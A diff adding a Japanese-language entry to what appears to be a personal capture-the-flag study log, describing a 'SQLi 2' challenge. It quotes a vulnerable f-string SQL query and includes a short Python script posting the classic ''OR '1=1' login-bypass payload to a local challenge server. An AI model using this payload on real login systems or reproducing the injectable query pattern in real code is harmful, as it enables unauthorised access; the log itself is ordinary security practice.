@@ -220,3 +220,31 @@ python exploit.py | grep 'flag'
 #+begin_comment
 9 day streak...
 #+end_comment
+* SQLi 2
+サーバーの以下の部分で ~username~ に ~admin~ を指定し、加えて ~password = '' OR '1=1'~ として、条件を真にする。
+よって、 ~pword~ で指定する文字列は ~'OR '1=1~ となる。
+
+#+begin_src python
+query = f"SELECT rowid, * FROM users WHERE username = '{username}' AND password = '{ password }'
+#+end_src
+
+#+begin_src python :eval no
+#!/usr/bin/env python
+
+import requests
+
+url = "http://challenge.localhost/gateway"
+
+session = requests.Session()
+
+payload = {
+    "userid": "admin",
+    "pword": "'OR '1=1"
+}
+
+try:
+    response = session.post(url, data=payload)
+    print(response.text)
+except:
+    print("Error")
+#+end_src
